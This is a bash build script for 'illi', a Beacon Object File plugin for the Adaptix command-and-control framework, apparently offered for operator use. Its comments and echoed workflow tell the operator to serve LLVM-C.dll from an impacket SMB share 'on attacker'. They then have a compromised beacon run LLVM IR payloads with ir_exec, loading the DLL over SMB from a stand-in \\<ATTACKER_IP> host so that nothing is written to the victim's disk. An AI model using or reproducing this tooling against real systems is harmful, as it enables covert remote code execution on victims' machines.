#!/usr/bin/env bash
# build.sh — compile illi BOF for Adaptix
# Run once on the teamserver / operator machine (Linux with mingw-w64).
# Output lands next to illi.axs so ax.script_dir() finds it.
#
# Operator setup before any session:
#   impacket-smbserver ILLI /opt/illi/ -smb2support
#   # /opt/illi/ must contain LLVM-C.dll
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BOF_DIR="${SCRIPT_DIR}/bof"

compile() {
    local src="$1" out="$2"
    if [[ ! -f "$src" ]]; then
        echo "ERROR: $src not found"
        exit 1
    fi
    echo "  compiling $(basename "$src") ..."
    x86_64-w64-mingw32-gcc -o "$out" -c "$src" \
        -masm=intel -fno-builtin \
        -Wall -Wno-unused-function -Wno-incompatible-pointer-types
    echo "  → $out ($(wc -c < "$out") bytes)"
}

echo "=== Building illi BOF ==="
compile "${BOF_DIR}/illi_orc_bof.c" "${SCRIPT_DIR}/illi_orc_bof.x64.o"

echo ""
echo "=== Done ==="
echo "Load illi.axs in Adaptix: Plugins → Load → illi.axs"
echo ""
echo "Workflow:"
echo "  # 1. Start SMB share on attacker:"
echo "  impacket-smbserver ILLI /opt/illi/ -smb2support"
echo ""
echo "  # 2. Run IR in beacon (LLVM-C.dll loaded over SMB, no victim disk write):"
echo "  ir_exec /opt/payloads/final.ll \\\\<ATTACKER_IP>\\ILLI\\LLVM-C.dll"
echo "  ir_exec /opt/payloads/final.ll \\\\<ATTACKER_IP>\\ILLI\\LLVM-C.dll --fn nax_main"
